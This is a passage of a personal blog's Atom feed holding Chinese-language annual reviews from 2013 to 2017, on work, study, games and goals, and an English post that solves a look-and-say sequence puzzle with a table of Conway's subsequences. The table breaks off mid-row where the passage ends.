    <content type="html"><![CDATA[<p>工作:</p><ul><li><p>安全方向；</p></li><li><p>大数据；</p></li><li><p>机器学习初学：线性回归，神经网路，SVM；</p></li><li><p>深度学习入门</p></li><li><p>语言：Python, iOS, Go</p></li><li><p>阅读/读书：非技术的书阅读较少，五本左右</p></li><li><p>知识整理系统：RSS, PinBoard -&gt; Pocket -&gt; IFTTT -&gt; Evernote记录，github分析</p></li><li><p>开源项目，维护乏力，hiwifi-ss</p></li><li><p>我的专长：</p><ul><li>数学基础：机器学习和深度学习有天然的优势</li><li>我的弱点：对于做事情的热度不够持久=&gt; 利用这点，每种学一段，交替进行</li><li>情绪管理：无法控制自己的情绪对于自己工作的影响，一度不知道怎么控制自己</li></ul></li></ul><p>目标：</p><ul><li>网路自由化和安全化：RSS，翻墙，去中心化运动，网络中立</li></ul><p>产品和实现</p><ol><li>机器学习和深度学习</li><li>Python</li><li>iOS, macOS开发</li><li>架构</li><li>生活：自我认知，恋爱，惰性</li><li>情绪影响工作</li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      年度总结 - 2017年
    
    </summary>
    
      <category term="生活" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="总结" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>年度总结 - 2016年，是忙碌而无知的一年</title>
    <link href="https://qiwihui.com/qiwihui-blog-6/"/>
    <id>https://qiwihui.com/qiwihui-blog-6/</id>
    <published>2018-10-09T05:21:03.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>2016年是毕业后觉得过得最快的一年，也是至今觉得过得最快的一年。因为&quot;忙碌&quot;和没有思考，我在这一年过得没有目标，没有计划。</p><span id="more"></span><h2><span id="ingress-he-minecraft">Ingress 和 Minecraft</span></h2><p>2016年主要玩了两款游戏：Ingress 和 Minecraft（我的世界）。在Ingress上花费了很多的夜晚时间，在 Minecraft 上花费了一些周末时间。</p><h3><span id="ingress">Ingress</span></h3><p>入坑 Ingress 已经四年，今年重新捡起，从7月到11月，我用了五个月的时间从原来的8级升到了16级（游戏等级上线），时间是2016年11月30日23点58分，总计4，0000，000AP。16级，我的第一个念头是：<strong>Never Again</strong>，我再也不能16级了，可能再也不会半夜两三点仍然在路上活动，可能再也不会冻手冻脚地在寒风中画图，可能再也奔波几十公里去连一条 link，可能再也不会月走路330km… 但依旧会和队友一起做刷任务，做多重。每一次升级，都是一次never again 事情，但是这一次真的就never again 了。Ingress 的游戏经历回想过来也是像电影一样：入坑，摸索，渐熟，AFK，归来，重拾，融入，疯狂，最后归于平静。也许之后回想起来这一段时间，也会感叹一句：也曾经疯狂过。</p><p>P.S. 同一个号可以转阵营重置而再次16级，但是，你愿意背弃自己的信仰么？</p><h3><span id="minecraft">Minecraft</span></h3><p>我的世界很自由，所有的东西都可以自己构建，因此世界只限制于想象力。自己维护了一个 Minecraft 的服务器，和朋友共同建设了一个世界。</p><h2><span id="kai-yuan-xiang-mu-gong-xian">开源项目贡献</span></h2><h3><span id="hiwifi-ss">hiwifi-ss</span></h3><p>我在8月1号开始维护开源项目：<a href="https://github.com/qiwihui/hiwifi-ss">hiwifi-ss</a>, 这是一个基于前人工作做的极路由翻墙插件，主要完成了在新版本极路由上的界面更新和功能修复。因为工作和 Ingress 的原因，这个项目在10月底就暂时没有继续维护了。</p><p>还想做一些其他的项目和实现一些其他的想法，比如一个RSS在线阅读器。</p><h2><span id="xue-xi">学习</span></h2><h3><span id="ji-neng">技能</span></h3><p>2016年缺乏系统地学习。之前获取和记录知识的过程（书，RSS, 博客等 -&gt; Pocket暂存 -&gt; Evernote记录和归纳 -&gt; 博文输出）并没有很好的实行和保持，使得代码虽然会写，但是没有系统地去理解为什么，没有去理解怎样更好。拿搬砖来讲，只是回垒墙，还没有上升到造房子或者造更好的房子的程度。</p><h3><span id="du-shu">读书</span></h3><p>今年没有读太多的书，准确说很少，以至于在最近的一段时间明显感觉到粗口增加，思考迷茫。看的文章很碎，而且没有及时思考，使得这一年没有太多的思想收入。</p><h3><span id="ying-yu-ri-yu">英语、日语</span></h3><p>最近一段时间的英语学习质量也明显下降，多次任务没有认真及时完成，总体感觉能力没有提升。日语学习中断，停滞不前。</p><h2><span id="sheng-huo">生活</span></h2><p>生活依旧是生活。</p><h3><span id="ye">夜</span></h3><p>今年喜欢上了星星，很多时间在晚上活动，很多时候熬夜到很晚不肯睡。其实这也没有什么不对。只是如无必要，不要晚睡。</p><h3><span id="you">游</span></h3><p>2016年想去很多地方，然而总是错过，广州，深圳，杭州，上海，以及一直以来的衡山，都成为了今年的遗憾。唯一的努力是完成了十月计划而耽搁的日本之行，第一次出国成就达成。但是计划不足和日语能力也使得这次出行有些仓促，没有达到自己的预期。</p><h3><span id="gan-qing">感情</span></h3><blockquote><p>逃避问题和冷漠处理问题都是感情的敌人。(来自一个人的反思)</p></blockquote><p>逃避可耻且没有用。然而一个人却可以做很多事情而不需要进行顾虑太多。</p><h3><span id="she-jiao">社交</span></h3><p>有很多的时间花在了刷 Twitter 上，没事了刷，吃完饭刷，中午刷，晚上刷，甚至有时走路都在刷。认识了一些新朋友，但是除了游戏和社交软件上的对话，没有更多深入的交流了。</p><h2><span id="zong-jie-he-ji-hua">总结和计划</span></h2><h3><span id="zong-jie">总结</span></h3><p><strong>计划有余而行动不足</strong>，是这一年的总结。很多事情有了开始，但是没有很好地坚持下去</p><h3><span id="2017-nian-de-ji-hua">2017年的计划</span></h3><blockquote><p>日拱一卒，功不唐捐。</p></blockquote><p>这是以后的每一年计划的一个宗旨：至少要坚持干完一件事情！每年都想做很多事情，但可能没有时间，也可能没有精力，不期待速成，但求每天都有进步。</p><p>详：</p><ol><li><strong>早睡</strong> 如无必要，不许晚睡。如果没有非要第二天完成的事情，不要晚睡。睡前完成阅读任务即可。</li><li><strong>早起</strong> 早起是一种习惯，坚持。早起之后可以做如下事情：静坐，总结前一天和活动和列举当天的任务，或者早起简单的运动。</li><li><strong>戒咖啡</strong> 原因很简单，咖啡影响节律控制和胃。</li><li><strong>每天阅读半小时</strong> 阅读指阅读除了技术书籍以外的书籍，每看完一本书都需要思考和总结。</li><li><strong>每周写总结</strong> 包括工作总结和非工作总结。</li><li><strong>每周一篇博客</strong> 技术博客或者其他内容博客，但是每月技术博客数量应该要多余其他博客数量。总结也好，记录也好，要有输出，才能进步。</li><li><strong>每天拍一张照片</strong> 简单，但是坚持，发在 Instagram 上。</li></ol><p>简：</p><ol><li>技术成长。</li></ol><ul><li>网络基础知识和操作系统知识；</li><li>全栈（开发，运维，产品等）知识构建；</li><li>语言：动态语言，函数语言和强类型语言；</li><li>维护开源项目；</li></ul><ol><li>知识记录，归纳和总结：（书，RSS, 博客等 -&gt; Pocket暂存 -&gt; Evernote记录和归纳 -&gt; 博文输出）</li><li>坚持锻炼身体，合理饮食。</li><li>学好日语。<strong>这是今年要坚持完成的一件事</strong>。</li><li>英语不落下。</li><li>完成一次旅行，登山。</li><li>学会独处。</li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      年度总结 - 2016年，是忙碌而无知的一年
    
    </summary>
    
      <category term="生活" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="总结" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>年度总结 - 我的2015, 做了很多事, 欠了很多债</title>
    <link href="https://qiwihui.com/qiwihui-blog-5/"/>
    <id>https://qiwihui.com/qiwihui-blog-5/</id>
    <published>2018-10-09T05:19:34.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>一句话总结2015年: 做了很多事, 欠了很多债。</p><span id="more"></span><h2><span id="2015-nian"><strong>2015年</strong></span></h2><p>年初三月离开了毕业后的第一份正式工作, 七月底加入<a href="http://www.qssec.com">青松</a>, 中间的四个月从迷茫焦虑, 到完成第一次知识整合和补充, 算是一次小的飞跃。 在新团队的这半年是自己能力和知识增长最快的半年。</p><p>感谢一路陪伴的岩, 许多事情不再纠结, 更有勇气去做一件事情。</p><p>整理和输出的东西太少, Evernote 和 Pocket 上记录的文章基本未有效整理, 博客自上次更新已是半年, 这点需要改进。</p><p>个人项目上, COMICS项目, 微信RSS项目和自己的公众号(我都忘了叫啥了)相继停止了维护/更新。 开源项目基本维持在阅读和 fork 别人项目的水平上, 对开源项目的贡献不够。自己开发和信息收集的方法工具没有整理。</p><p>2015年阅书寥寥, 《三体》和《量子物理史话》是为数不多的能记住的, 倒是知乎上迄今645万字的阅读量确实令我咋舌, 读书的质和量都有待提高。</p><p>语言能力上, 英语继续保持之前的学习量, 只是意语刚开始没多久就放弃了。</p><p>每年都会学一项不一样的技能或者挑战一件不一样的事情, 2015年一个人背包旅行了一个月, 见识了江南的风景, 新增的技能就算滑雪了。相较于之前, 2015年的技能成长比较缓慢。</p><p>2015年半壮半胖得长了十斤, 体重达到了历史最高点, 这是一段时间失衡与调整的结果。 2016年需要停止增长, 增加体能和力量训练。</p><h2><span id="2016-nian-mu-biao"><strong>2016年目标</strong></span></h2><h3><span id="ge-ren-neng-li-cheng-chang-shang">个人能力成长上:</span></h3><ul><li>编程能力上, Python/Django 编程能力加强, 深入理解代码运行的底层机制;</li><li>计算机基础知识的补足, 主要是网络知识和数据结构, 算法知识等;</li><li>前端能力以及产品化能力;</li><li>系统化知识的学习方法和框架, 增加整理和输出;</li><li>利用自己掌握的资源, 建立信息收集和整合项目, 打造自己的工具。</li></ul><h3><span id="sheng-huo-shang">生活上</span></h3><ul><li>一两项新的技能, 一项自我挑战, 一张共同的愿望清单;</li><li>乐观一些, 简单一些。</li></ul><p>2015年是变革与变化, 机遇和挑战。新的一年, 新的成长, 新的奋斗, 不变的梦想!</p><h2><span id="fu-lu-yi-xia-dou-bi-de-guo-qu"><strong>附录一下逗比的过去</strong>:</span></h2><ul><li><a href="/posts/3">年度总结 - 2014年的点点滴滴</a></li><li><a href="/posts/4">年度总结 - 过去的2013年</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      年度总结 - 我的2015, 做了很多事, 欠了很多债
    
    </summary>
    
      <category term="生活" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="总结" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>年度总结 - 2014年的点点滴滴</title>
    <link href="https://qiwihui.com/qiwihui-blog-4/"/>
    <id>https://qiwihui.com/qiwihui-blog-4/</id>
    <published>2018-10-09T05:17:15.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>在2014年还有15天就结束的时候，总结一下自己在2014年的工作生活和学习。2014年的故事比2013年少，但是琐碎的学习项目和整理多了很多。</p><span id="more"></span><p>** 学习环境 **</p><ul><li>feedly: rss聚合阅读</li><li>Evernote: 做笔记</li><li>Pocket: 稍后阅读</li><li>Trello: 项目管理</li><li>blog: 知识整理和创造</li><li>基本实现Windows, Ubuntu, Android, Mac, iOS平台之间数据同步</li></ul><p>** Linux **</p><ul><li>bash脚本初步</li><li>Arch Linux安装和基本配置</li><li>Raspberry Pi: LAMP</li><li>gunicorn使用</li><li>nginx入门</li></ul><p>** Vim + Git **</p><ul><li>使用YCM</li><li>dotfile(e.g. .vimrc, …)备份以及工作环境快速配置</li><li>git以及github常用基础功能</li></ul><p>** C **</p><ul><li>2048 in C (其实没完成)</li><li>PDT(a tiny card game demo) in C</li></ul><p>** Python **</p><ul><li>PDT in python</li><li>初学Django</li><li>Virtualenv虚拟python环境</li><li>pip</li></ul><p>** Web **</p><ul><li>使用Jekyll</li><li>github pages</li><li>博客采用Markdown</li><li>Html5 + CSS3基础</li><li>OAuth 2.0</li><li>全平台Cross the Great Firewall</li><li>Tor</li><li>网络基础</li></ul><p>** Mac/iOS **</p><ul><li>Swift语言入门</li><li>AFNetworking框架</li><li>ShanbayWords.app Demo</li><li>SwiftWeather.app Demo</li><li>iOS Frameworks概览</li><li>cocoapods管理类库</li><li>Html5 web离线app</li></ul><p>** 读书 **</p><ul><li>《开源世界旅行手册》</li><li><em>Dive into Python3</em></li><li><em>Getting started with OAuth 2.0</em></li><li><em>Getting Real</em></li><li>《黑客与画家》</li><li>《算法概论》（* Algorithms *，PDV）</li><li>《一个陌生女人的来信》</li><li>《饥饿游戏》（I, II,III）</li><li>…</li></ul><p>** 设备 **</p><ul><li>2014年新入4台设备：（略）。</li></ul><p>** 生活 **</p><ul><li>六月初去了北戴河，然后是泰山，七月嵩山，恒山和九月西安、华山。</li><li>Color Run</li><li>庆幸只发烧了两天，继续保持。</li></ul><p>以上就像列家常一样把2014年能记得的东西都写了个遍，那么问题来了，挖掘机…不：</p><ol><li>很多事情不能及时记录：所有的事情更像是五月份之后做的，五月之前的基本没记住。</li><li>时间花销记录不清楚：总感觉事情多，但是却不知道时间用到哪边去了。</li><li>看的书太少：没有2013年多，成系统的书少，非技术书类少，2014年主要倾向于开发文档和碎片化的文章，对知识和认识的系统化贡献少。</li></ol><p>因此2015年在这写方面确实要改善和加强。故制定2015年的主要目标如下（比较宽的目标，无先后，要细分）：</p><ol><li><p>规划：</p><ul><li>每周有小结，三月一次书面记录和总结</li><li>日常时间花销记录（e.g. RescueTime）</li><li>学会记账</li><li>静坐和冥想（谁用谁知道！）</li><li>读书以及读书笔记，锻炼 -&gt; 100日行动</li></ul></li><li><p>学习：</p><ul><li>Python: 常见标准库的了解和重点学习</li><li>Swift: GUI基本设计，Cocoa Touch layer基本</li><li>网络基础</li><li>算法和数据结构：基本算法和数据结构的理解和掌握</li><li>数学知识的回顾和加强</li><li>英语加强，托福</li></ul></li><li><p>杂项</p><ul><li>继续未完成的旅行：衡山，以及青海。</li></ul></li></ol><p>2015年想来事情也是比较多的，加油！</p><p>Wait, wait! 虽然2015年还有15天到来，但是可以做的事情还是很多，好好想想，and期待惊喜的发生！</p><p>P.S. 明年总结的时候这个也会是比较二的一篇，除非我没有进步！</p><p>2013年的总结：<a href="/posts/3">年度总结 - 过去的2013年</a>。突然觉得这个好矫情啊!!</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      年度总结 - 2014年的点点滴滴
    
    </summary>
    
      <category term="生活" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="总结" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>年度总结 - 过去的2013年</title>
    <link href="https://qiwihui.com/qiwihui-blog-3/"/>
    <id>https://qiwihui.com/qiwihui-blog-3/</id>
    <published>2018-10-09T05:15:15.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>写在2013年到2014年还有不到一个月的时候, 对我第一年工作的状态有一个简单的描述, 每年都要给自己写一个年终总结。</p><span id="more"></span><h3><span id="de">得</span></h3><ul><li>选择了和有共同目标的团队一起调研，奋斗的感觉真好。</li><li>选择了请假写论文，这样我可以学霸一次。</li><li>选择了毕业向喜欢的女生表白，不想彼此错过，虽然很短暂。</li><li>选择了毕业工作，放弃保研，不去考公务员，我不后悔自己的选择，这会是一次milestone。</li><li>选择了在公司附近租房，虽然有些贵，但是不用挤三小时地铁。</li><li>选择了扇贝，收获了一种学习习惯。</li><li>选择了写博客，<a href="http://xn--Daozhang-sc0mo0ce80a4gy33j.info">建个人博客Daozhang.info</a>，写BUCTML网站(inBuilding)，虽然还在构建中。</li><li>选择了贡献开源项目<a href="https://github.com/qiwihui">@github</a>，因为我开始讨厌封闭的W系统。</li><li>现在每天都要看几页书，虽然少，但积累的力量很恐怖，不看不爽说。</li><li>我喜欢吃巧克力，而且是黑巧克力。</li><li>选择了学轮滑，耍蝴蝶刀，因为我喜欢。</li><li>选择了给自己一个KeepStudying梦，我会为之而努力！多谢老姐的泼热水支持。</li><li>感谢一路相伴的大学童鞋，四年的感觉真好，重逢必有时！</li><li>工作团队很喜欢，哈哈！</li></ul><h3><span id="shi">失</span></h3><ul><li>因为生病，错过了班级的毕业旅行，再也没有了。</li><li>今年没有去宁波，只能等到明年了，我不是拖延症。</li><li><a href="https://www.facebook.com/weihui.qiu">Facebook</a>, <a href="https://twitter.com/QiuWeihui1">Twitter</a>, <a href="https://plus.google.com/+WeihuiQiu/">G+</a>, QQ, Wechat…分散了我的精力，有社交依赖了。</li><li>没能把Google Glass的购买码送出去，人品。</li><li>我不想扯到关于买房买车的问题。</li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      年度总结 - 过去的2013年
    
    </summary>
    
      <category term="生活" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="总结" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>One problem at Haidian Book City</title>
    <link href="https://qiwihui.com/qiwihui-blog-2/"/>
    <id>https://qiwihui.com/qiwihui-blog-2/</id>
    <published>2018-10-09T05:07:20.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>Today, I just came by Haidian Book City as usual at Haidian dist inBeijing. and I found the problem hung on the wall nearby. It is veryinteresting and I want to share it.</p><span id="more"></span><h2><span id="0x00-problem"><strong>0x00 Problem</strong></span></h2><p>Here is one picture of it.</p><p><img src="https://user-images.githubusercontent.com/3297411/45277447-6ab6f900-b4fa-11e8-8201-8f9482f9e775.jpg" alt="27-problem_at_haidian_book_city"></p><p>A translation of that:</p><blockquote><p><em>Solve this problem, then it’s your domain:</em><em>{3, 13, 1113, 3113,…, the 8<sup>th</sup> number}.angelcrunch.com</em><br><em>(the QR code leads to the below link)</em><em><a href="http://www.angelcrunch.com/jiemi">www.angelcrunch.com/jiemi</a></em></p></blockquote><p>Once you finish it, you will get the second as below:</p><blockquote><p><em>Guess a television series by the following numbers, and you will get an interview.</em><em>3113112211322112 / 311311</em></p></blockquote><h2><span id="0x01-solution"><strong>0x01 Solution</strong></span></h2><p>Yes, as you may guess, it is one look-and-say sequence(sequence <a href="http://oeis.org/A006715">A006715</a> in<a href="http://en.wikipedia.org/wiki/On-Line_Encyclopedia_of_Integer_Sequences">OEIS</a>.</p><p>In the sewuence, each member is genrated from the previous menber by&quot;reading&quot; off the digits in it, counting rhe number of digits in groups ofthe same digit. For example:</p><ul><li>3 is reading off as “one 3” or 13.</li><li>13 is reading off as “one 1 one 3” or 1113.</li><li>1113 is reading off as “three 1s, then one 3” or 3113.</li><li>and so on.</li></ul><p>If we start with any digit <em>d</em> from 0 to 9 then <em>d</em> will remainindefinitely as the last digit of the sequence. For <em>d</em> different from 1, thesequence starts as follows:</p><p><em>d, 1d, 111d, 311d, 13211d, 111312211d, 31131122211d, …</em></p><p>As example in the following table.</p><p>    <table style="margin-right: auto; white-space: nowrap; width: auto;">      <tr style="Text">        <td align="left"><b><i>d</i></b></td>        <td align="left"><b>Sloane</b></td>        <td align="left"><b>sequence</b></td>      </tr>      <tr style="Text">        <td align="left">1</td>        <td align="left"><a href="http://oeis.org/A005150">A005150</a></td>        <td align="left">1, 11, 21, 1211, 111221, 312211, 13112221, 1113213211, ...</td>      </tr>      <tr style="Text">        <td align="left">2</td>        <td align="left"><a href="http://oeis.org/A006751">A006751</a></td>        <td align="left">2, 12, 1112, 3112, 132112, 1113122112, 311311222112, ...</td>      </tr>      <tr style="Text">        <td align="left">3</td>        <td align="left"><a href="http://oeis.org/A006715">A006715</a></td>        <td align="left">3, 13, 1113, 3113, 132113, 1113122113, 311311222113, ...</td>      </tr>    </table></p><p>Here, <em>d</em> equals 3.</p><p>So the first answer is 13211321322113.</p><p>For the second one, you need to know more about the sequence.John Conway studied this sequence and found that the 8<sup>th</sup>member and every member after it in the sequence is made up of one or moreof 92 “basic” non-interacting subsequences. The 92 basic subsequence showsin the following table(from <a href="http://www.pdmi.ras.ru/~lowdimma/topics_nth/conway_blocks.pdf">here</a>.</p><p>The fouth column in the table says what othersubsequences the given subsequence evolves into. He also show that thenumber of the digits in each member of the sequence grows a constant fromone member to the next. If L<ins>n</ins> is the number of the digits in then<sup>th</sup> member in the sequence, then L<ins>n+1</ins>/L<ins>n</ins> toa limitation when n to infinity. It is 1.303577269… , which we call itas <strong>Conway Constant</strong>.</p><p>  <table style="margin-right: auto; white-space: nowrap; width: auto;">      <tbody>        <tr>          <th>No.</th>          <th>Subsequence</th>          <th>Length</th>          <th>Evolves Into</th>        </tr>        <tr>          <td><strong>1</strong></td>          <td>1112</td>          <td>4</td>          <td>(63)</td>        </tr>        <tr>          <td><strong>2</strong></td>          <td>1112133</td>          <td>7</td>          <td>(64)(62)</td>        </tr>        <tr>          <td><strong>3</strong></td>          <td>111213322112</td>          <td>12</td>          <td>(65)</td>        </tr>        <tr>          <td><strong>4</strong></td>          <td>111213322113</td>          <td>12</td>          <td>(66)</td>        </tr>        <tr>          <td><strong>5</strong></td>          <td>1113</td>          <td>4</td>          <td>(68)</td>        </tr>        <tr>          <td><strong>6</strong></td>          <td>11131</td>          <td>5</td>          <td>(69)</td>        </tr>        <tr>          <td><strong>7</strong></td>          <td>111311222112</td>          <td>12</td>          <td>(84)(55)</td>        </tr>        <tr>          <td><strong>8</strong></td>          <td>111312</td>          <td>6</td>          <td>(70)</td>        </tr>        <tr>          <td><strong>9</strong></td>          <td>11131221</td>          <td>8</td>          <td>(71)</td>        </tr>        <tr>          <td><strong>10</strong></td>          <td>1113122112</td>          <td>10</td>          <td>(76)</td>        </tr>        <tr>          <td><strong>11</strong></td>          <td>1113122113</td>          <td>10</td>          <td>(77)</td>        </tr>        <tr>          <td><strong>12</strong></td>          <td>11131221131112</td>          <td>14</td>          <td>(82)</td>        </tr>        <tr>          <td><strong>13</strong></td>          <td>111312211312</td>          <td>12</td>          <td>(78)</td>        </tr>        <tr>          <td><strong>14</strong></td>          <td>11131221131211</td>          <td>14</td>          <td>(79)</td>        </tr>        <tr>          <td><strong>15</strong></td>          <td>111312211312113211</td>          <td>18</td>          <td>(80)</td>        </tr>        <tr>          <td><strong>16</strong></td>          <td>111312211312113221133211322112211213322112</td>          <td>42</td>          <td>(81)(29)(91)</td>        </tr>        <tr>          <td><strong>17</strong></td>          <td>111312211312113221133211322112211213322113</td>          <td>42</td>          <td>(81)(29)(90)</td>        </tr>        <tr>          <td><strong>18</strong></td>          <td>11131221131211322113322112</td>          <td>26</td>          <td>(81)(30)</td>        </tr>        <tr>          <td><strong>19</strong></td>          <td>11131221133112</td>          <td>14</td>          <td>(75)(29)(92)</td>        </tr>        <tr>          <td><strong>20</strong></td>          <td>1113122113322113111221131221</td>          <td>28</td>          <td>(75)(32)</td>        </tr>        <tr>          <td><strong>21</strong></td>          <td>11131221222112</td>          <td>14</td>          <td>(72)</td>        </tr>        <tr>          <td><strong>22</strong></td>          <td>111312212221121123222112</td>          <td>24</td>          <td>(73)</td>        </tr>        <tr>          <td><strong>23</strong></td>          <td>111312212221121123222113</td>          <td>24</td>          <td>(74)</td>        </tr>        <tr>          <td><strong>24</strong></td>          <td>11132</td>          <td>5</td>          <td>(83)</td>        </tr>        <tr>          <td><strong>25</strong></td>          <td>1113222</td>          <td>7</td>          <td>(86)</td>        </tr>        <tr>          <td><strong>26</strong></td>          <td>1113222112</td>          <td>10</td>          <td>(87)</td>        </tr>        <tr>          <td><strong>27</strong></td>          <td>1113222113</td>          <td>10</td>          <td>(88)</td>        </tr>        <tr>          <td><strong>28</strong></td>          <td>11133112</td>          <td>8</td>          <td>(89)(92)</td>        </tr>        <tr>          <td><strong>29</strong></td>          <td>12</td>          <td>2</td>          <td>(1)</td>        </tr>        <tr>          <td><strong>30</strong></td>          <td>123222112</td>          <td>9</td>          <td>(3)</td>        </tr>        <tr>          <td><strong>31</strong></td>          <td>123222113</td>          <td>9</td>          <td>(4)</td>        </tr>        <tr>          <td><strong>32</strong></td>          <td>12322211331222113112211</td>          <td>23</td>          <td>(2)(61)(29)(85)</td>        </tr>        <tr>          <td><strong>33</strong></td>          <td>13</td>          <td>2</td>          <td>(5)</td>        </tr>        <tr>          <td><strong>34</strong></td>          <td>131112</td>          <td>6</td>          <td>(28)</td>        </tr>        <tr>          <td><strong>35</strong></td>          <td>13112221133211322112211213322112</td>          <td>32</td>          <td>(24)(33)(61)(29)(91)</td>        </tr>        <tr>          <td><strong>36</strong></td>          <td>13112221133211322112211213322113</td>          <td>32</td>          <td>(24)(33)(61)(29)(90)</td>        </tr>        <tr>          <td><strong>37</strong></td>          <td>13122112</td>          <td>8</td>          <td>(7)</td>        </tr>        <tr>          <td><strong>38</strong></td>          <td>132</td>          <td>3</td>          <td>(8)</td>        </tr>        <tr>          <td><strong>39</strong></td>          <td>13211</td>          <td>5</td>          <td>(9)</td>        </tr>        <tr>          <td><strong>40</strong></td>          <td>132112</td>          <td>6</td>          <td>(10)</td>        </tr>        <tr>          <td><strong>41</strong></td>          <td>1321122112</td>          <td>10</td>          <td>(21)</td>        </tr>        <tr>          <td><strong>42</strong></td>          <td>132112211213322112</td>          <td>18</td>          <td>(22)</td>        </tr>        <tr>          <td><strong>43</strong></td>          <td>132112211213322113</td>          <td>18</td>          <td>(23)</td>        </tr>        <tr>          <td><strong>44</strong></td>          <td>132113</td>          <td>6</td>          <td>(11)</td>        </tr>        <tr>          <td><strong>45</strong></td>          <td>1321131112</td>          <td>10</td>          <td>(19)</td>        </tr>        <tr>          <td><strong>46</strong></td>          <td>13211312</td>          <td>8</td>          <td>(12)</td>        </tr>        <tr>          <td><strong>47</strong></td>          <td>1321132</td>          <td>7</td>          <td>(13)</td>        </tr>        <tr>          <td><strong>48</strong></td>          <td>13211321</td>          <td>8</td>          <td>(14)</td>        </tr>        <tr>          <td><strong>49</strong></td>          <td>132113212221</td>          <td>12</td>          <td>(15)</td>        </tr>        <tr>          <td><strong>50</strong></td>          <td>13211321222113222112</td>          <td>20</td>          <td>(18)</td>        </tr>        <tr>          <td><strong>51</strong></td>          <td>1321132122211322212221121123222112</td>          <td>34</td>          <td>(16)</td>        </tr>        <tr>          <td><strong>52</strong></td>          <td>1321132122211322212221121123222113</td>          <td>34</td>          <td>(17)</td>        </tr>        <tr>          <td><strong>53</strong></td>          <td>13211322211312113211</td>          <td>20</td>          <td>(20)</td>        </tr>        <tr>          <td><strong>54</strong></td>          <td>1321133112</td>          <td>10</td>          <td>(6)(61)(29)(92)</td>        </tr>        <tr>          <td><strong>55</strong></td>          <td>1322112</td>          <td>7</td>          <td>(26)</td>        </tr>        <tr>          <td><strong>56</strong></td>          <td>1322113</td>          <td>7</td>          <td>(27)</td>        </tr>        <tr>          <td><strong>57</strong></td>          <td>13221133112</td>          <td>11</td>          <td>(25)(29)(92)</td>        </tr>        <tr>          <td><strong>58</strong></td>          <td>1322113312211</td>          <td>13</td>          <td>(25)(29)(67)</td>        </tr>        <tr>          <td><strong>59</strong></td>          <td>132211331222113112211</td>          <td>21</td>          <td>(25)(29)(85)</td>        </tr>        <tr>          <td><strong>60</strong></td>          <td>13221133122211332</td>          <td>17</td>          <td>(25)(29)(68)(61)(29)(89)</td>        </tr>        <tr>          <td><strong>61</strong></td>          <td>22</td>          <td>2</td>          <td>(61)</td>        </tr>        <tr>          <td><strong>62</strong></td>          <td>3</td>          <td>1</td>          <td>(33)</td>        </tr>        <tr>          <td><strong>63</strong></td>          <td>3112</td>          <td>4</td>          <td>(40)</td>        </tr>        <tr>          <td><strong>64</strong></td>          <td>3112112</td>          <td>7</td>          <td>(41)</td>        </tr>        <tr>          <td><strong>65</strong></td>          <td>31121123222112</td>          <td>14</td>          <td>(42)</td>        </tr>        <tr>          <td><strong>66</strong></td>          <td>31121123222113</td>          <td>14</td>          <td>(43)</td>        </tr>        <tr>          <td><strong>67</strong></td>          <td>3112221</td>          <td>7</td>          <td>(38)(39)</td>        </tr>        <tr>          <td><strong>68</strong></td>          <td>3113</td>          <td>4</td>          <td>(44)</td>        </tr>        <tr>          <td><strong>69</strong></td>          <td>311311</td>          <td>6</td>          <td>(48)</td>        </tr>        <tr>          <td><strong>70</strong></td>          <td>31131112</td>          <td>8</td>          <td>(54)</td>        </tr>        <tr>          <td><strong>71</strong></td>          <td>3113112211</td>          <td>10</td>          <td>(49)</td>        </tr>        <tr>          <td><strong>72</strong></td>          <td>3113112211322112</td>          <td>16</td>          <td>(50)</td>        </tr>        <tr>          <td><strong>73</strong></td>          <td>3113112211322112211213322112</td>          <td>28</td>          <td>(51)</td>        </tr>        <tr>          <td><strong>74</strong></td>          <td>3113112211322112211213322113</td>          <td>28</td>          <td>(52)</td>        </tr>        <tr>          <td><strong>75</strong></td>          <td>311311222</td>          <td>9</td>          <td>(47)(38)</td>        </tr>        <tr>          <td><strong>76</strong></td>          <td>311311222112</td>          <td>12</td>          <td>(47)(55)</td>        </tr>        <tr>          <td><strong>77</strong></td>          <td>311311222113</td>          <td>12</td>          <td>(47)(56)</td>        </tr>        <tr>          <td><strong>78</strong></td>          <td>3113112221131112</td>          <td>16</td>          <td>(47)(57)</td>        </tr>        <tr>          